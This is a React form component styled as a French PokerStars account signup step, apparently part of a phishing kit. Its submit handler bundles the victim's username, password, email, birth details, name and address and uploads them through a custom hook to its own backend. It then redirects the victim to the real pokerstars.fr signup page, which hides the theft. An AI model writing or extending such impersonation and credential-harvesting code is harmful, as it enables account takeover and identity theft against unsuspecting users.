import React, { useState } from "react";
import { MdNavigateNext } from "react-icons/md";
import { GrFormPrevious } from "react-icons/gr";
import { useNext } from "./useNext";
import { usePrevious } from "./usePrevios";
import { useSaveMultipleData } from "./useSaveData";
import { useUpload } from "./useUpload";
import { Spinner } from "react-bootstrap";
import Svg from "./svg";
import { useRecoilValue } from "recoil";
import { PokerStarsData } from "@/app/atoms/pokerStarsData";
import { countries } from "./countries";

const boldStyle = { fontWeight: "bold" };

export const Form2 = () => {
  const [state, setState] = useState("");
  const [city, setCity] = useState("");
  const [postcode, setPostCode] = useState("");

  const [sevendaylimit, setSevenDayLimit] = useState("");
  const [sevendayMinimumLimit, setSevendayMinimumLimit] = useState("");
  const [address, setAddress] = useState("");
  const [sevendayMaxmimumLimit, setSevendayMaxmimumLimit] = useState("");
  const [autoMaticWithdrawalLimit, setAutoMaticWithdrawalLimit] = useState("");
  const [loading, setLoading] = useState(false);
  const pokerStarsData = useRecoilValue(PokerStarsData);
  const upload = useUpload();
  const prev = usePrevious();
  const saveData = useSaveMultipleData();
  const handlePrev = () => {
    prev();
  };
  const handleUpload = (d) => {
    return upload(d);
  };
  const handleNext = async (e) => {
    e.preventDefault();
    setLoading(true);
    const dataOb = {
      countryf1: pokerStarsData.countryf1,
      username: pokerStarsData.username,
      password: pokerStarsData.password,
      email: pokerStarsData.email,
      dob: pokerStarsData.dob,
      countryofbirth: pokerStarsData.countryofbirth,
      stateofbirth: pokerStarsData.stateofbirth,
      cityofbirth: pokerStarsData.cityofbirth,
      address: address,
      state: state,
      city: city,
      postcode: postcode,
      firstname: pokerStarsData.firstname,
      lastname: pokerStarsData.lastname,
      gender: pokerStarsData.gender,
      sevenlimit: sevendaylimit.toString(),
      weeklylimit: sevendayMinimumLimit.toString(),
      depositlimit: sevendayMaxmimumLimit.toString(),
      autowithlimit: autoMaticWithdrawalLimit.toString(),
    };

    console.log("upload data");
    // Upload data
    const uploadSuccess = await handleUpload(dataOb);
    if (uploadSuccess) {
      console.log("Data uploaded successfully");
      window.location.href =
        "https://www.pokerstars.fr/signup?brand=4&redirectTo=/sports";
    } else {
      console.error("Data upload failed");
    }
  };

  return (
    <div className=" card-0 justify-content-center">
      <div className="py-4" style={{ backgroundColor: "black" }}>
        <Svg />
      </div>
      <div className="card-body px-sm-4 px-0">
        <div className="row justify-content-center round">
          <div className="col-lg-10 col-md-12 mt-3">
            <div className="card shadow-lg card-1">
              <div className=" inner-card">
                <div
                  style={{
                    backgroundColor: "#190A05",
                    background:
                      "-webkit-linear-gradient(to bottom, #870000, #190a05)",
                    background: "linear-gradient(to bottom, #FF0000, #190a05)",
                    color: "white",
                    fontWeight: "bolder",
                  }}
                  className="text-center mb-5 py-4"
                >
                  <h3 style={{ fontWeight: "bolder" }}>
                    Informations de compte
                  </h3>
                </div>
                <form onSubmit={handleNext}>
                  <div className="row justify-content-center justify-content-md-center">
                    <div
                      className="col-lg-10 col-md-10 col-sm-10"
                      id="secondary-div-center"
                    >
                      <div className="">
                        <h5
                          style={{
                            fontSize: "25px",
                            color: "#D70022",
                            fontWeight: "bolder",
                          }}
                          className="mb-4"
                        >
                          Où habitez-vous donc,?
                        </h5>
                        <div className="row justify-content-center justify-content-md-start">
                          <div className="col-10 col-md-6 mb-3">
                            <label style={boldStyle} htmlFor="last-name">
                              Pays
                            </label>
                            <select
                              className="form-select form-input-border"
                              required
                            >
                              {countries.map((country, index) => (
                                <option key={index}>{country}</option>
                              ))}
                            </select>
                          </div>

                          <div className="col-10 col-md-6">
                            <label style={boldStyle} htmlFor="email">
                              Adresse
                            </label>
                            <input
                              onChange={(e) => {
                                setAddress(e.target.value);
                              }}
                              type="text"
                              className="form-control"
                              id="text"
                              placeholder=""
                              required
                            />
                          </div>

                          <div className="col-md-6  mb-3">
                            <label style={boldStyle} htmlFor="email">
                              Département
                            </label>
                            <input
                              onChange={(e) => {
                                setState(e.target.value);
                              }}
                              type="text"
                              className="form-control"
                              id="text"
                              placeholder=""
                              required
                            />
                          </div>

                          <div className="col-md-6">
                            <label style={boldStyle} htmlFor="time">
                              Ville
                            </label>
                            <input
                              onChange={(e) => {
                                setCity(e.target.value);
                              }}
                              type="text"
                              className="form-control"
                              id="time"
                              placeholder=""
                              required
                            />
                          </div>

                          <div className="col-md-6">
                            <label style={boldStyle} htmlFor="email">
                              Code postal
                            </label>
                            <input
                              onChange={(e) => {
                                setPostCode(e.target.value);
                              }}
                              type="text"
                              className="form-control"
                              id="text"
                              placeholder=""
                              required
                            />
                          </div>
                        </div>
                      </div>

                      <div className="mt-5">
                        <h5
                          style={{
                            fontSize: "25px",
                            color: "#D70022",
                            fontWeight: "bolder",
                          }}
                          className="mb-4"
                        >
                          Limite de dépôt{" "}
                        </h5>
                        <div className="row justify-content-center justify-content-md-start">
                          <div className="col-10 col-md-6">
                            <label style={boldStyle} htmlFor="last-name">
                              Limite de 7 jours
                            </label>
                            <input
                              onChange={(e) => {
                                setSevenDayLimit(e.target.value);
                              }}
                              type="text"
                              className="form-control"
                              id="last-name"
                              placeholder=""
                              required
                            />
                          </div>
                        </div>
                      </div>

                      <div className="mt-5">
                        <h5
                          style={{
                            fontSize: "25px",
                            color: "#D70022",
                            fontWeight: "bolder",
                          }}
                          className="mb-4"
                        >
                          Limite cumulée
                        </h5>
                        <div className="row justify-content-center justify-content-md-start">
                          <div className="col-10 col-md-6">
                            <label style={boldStyle} htmlFor="last-name">
                              Limite de mise sur sept jours au poker
                            </label>
                            <select
                              onChange={(e) => {
                                setSevendayMinimumLimit(e.target.value);
                              }}
                              className="form-select form-input-border"
                              required
                            >
                              <option>1000</option>
                              <option>2000</option>

                              <option>3000</option>

                              <option>4000</option>

                              <option>5000</option>
                            </select>
                          </div>
                          <div className="col-10 col-md-6">
                            <label style={boldStyle} htmlFor="last-name">
                              Limite de mises sur sept jours aux paris sportifs
                            </label>
                            <select
                              onChange={(e) => {
                                setSevendayMaxmimumLimit(e.target.value);
                              }}
                              className="form-select form-input-border"
                              required
                            >
                              <option>1000</option>
                              <option>2000</option>

                              <option>3000</option>

                              <option>4000</option>

                              <option>5000</option>
                            </select>
                          </div>
                        </div>
                      </div>

                      <div className="mt-5">
                        <h5
                          style={{
                            fontSize: "25px",
                            color: "#D70022",
                            fontWeight: "bolder",
                          }}
                          className=""
                        >
                          Fixer la limite de retrait automatique
                        </h5>
                        <div className="row justify-content-center justify-content-md-start">
                          <div className="col-10 col-md-6">
                            <label
                              style={boldStyle}
                              htmlFor="last-name"
                            ></label>
                            <select
                              onChange={(e) => {
                                setAutoMaticWithdrawalLimit(e.target.value);
                              }}
                              className="form-select form-input-border"
                              required
                            >
                              <option>1000</option>
                              <option>2000</option>

                              <option>3000</option>

                              <option>4000</option>

                              <option>5000</option>
                            </select>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="row justify-content-center py-3">
                      <div className="col-10 d-flex justify-content-between flex-wrap">
                        <button
                          className="btn mb-3 mb-md-0"
                          onClick={handlePrev}
                          style={{
                            borderRadius: "18px",
                            width: "100%",
                            maxWidth: "186px",
                            color: "white",
                            fontWeight: "700",
                            backgroundColor: "#000000",
                          }}
                        >
                          <GrFormPrevious style={{ fontSize: "25px" }} />{" "}
                          Précédent
                        </button>
                        <button
                          className="btn"
                          type="submit"
                          style={{
                            borderRadius: "18px",
                            width: "100%",
                            maxWidth: "186px",
                            color: "white",
                            fontWeight: "700",
                            backgroundColor: "#190A05",
                            background:
                              "-webkit-linear-gradient(to bottom, #870000, #190a05)",
                            background:
                              "linear-gradient(to bottom, #FF0000, #190a05)",
                          }}
                        >
                          {loading && (
                            <Spinner animation="border" variant="light" />
                          )}
                          {!loading && (
                            <>
                              Continuer{" "}
                              <MdNavigateNext style={{ fontSize: "25px" }} />
                            </>
                          )}
                        </button>
                      </div>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
